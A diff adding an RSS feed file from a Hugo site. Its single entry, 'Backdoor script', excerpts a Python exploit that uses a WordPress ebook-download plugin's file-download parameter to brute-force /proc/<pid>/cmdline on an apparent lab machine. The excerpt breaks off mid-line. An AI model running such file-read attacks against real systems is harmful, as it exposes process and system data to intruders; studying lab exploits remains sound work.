@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>scripts on Swaipy</title>
+    <link>http://localhost:1313/tags/scripts/</link>
+    <description>Recent content in scripts on Swaipy</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Mon, 15 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/tags/scripts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Backdoor script</title>
+      <link>http://localhost:1313/scripts/backdoorscript/</link>
+      <pubDate>Mon, 15 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/scripts/backdoorscript/</guid>
+      <description>Backdoor script #!/usr/bin/python3 from pwn import * import requests, signal, time, sys, pdb def def_handler(sig, frame): print(&amp;#34;\n exit&amp;#34;) sys.exit(1) #def makeRequest(): # Ctrl+C signal.signal(signal.SIGINT, def_handler) # variables main_url = &amp;#34;http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=&amp;#34; def makeRequest(): p1 = log.progress(&amp;#34;Brute Force Attack&amp;#34;) p1.status(&amp;#34;Starting brute force attack&amp;#34;) time.sleep(2) for i in range(1, 1000): p1.status(&amp;#34;trying with PATH /proc/%s/cmdline&amp;#34; % str(i)) url = main_url + &amp;#34;/proc/&amp;#34; + str(i) + &amp;#34;/cmdline&amp;#34; #print(url) r = requests.get(url) if len(r.content) &amp;gt; 82: print(&amp;#34;======================&amp;#34;) log.</description>
+    </item>
+    
+  </channel>
+</rss>
